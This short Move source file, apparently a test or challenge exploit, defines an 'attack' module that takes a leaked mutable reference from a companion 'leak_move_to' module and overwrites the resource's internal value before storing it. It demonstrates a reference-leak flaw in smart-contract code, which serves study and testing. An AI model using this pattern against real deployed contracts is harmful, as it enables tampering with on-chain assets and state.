module deploy_address::attack {
    // use std::signer::address_of;
    use deploy_address::leak_move_to;

    struct Contrainer has key {
        res: leak_move_to::Simple
    }

    public fun attack(acc: &signer) {
        let res = leak_move_to::g();
        let leaked_pointer = leak_move_to::leak(&mut res);
        *leaked_pointer = 14;
        move_to(acc, Contrainer { res });
    }
}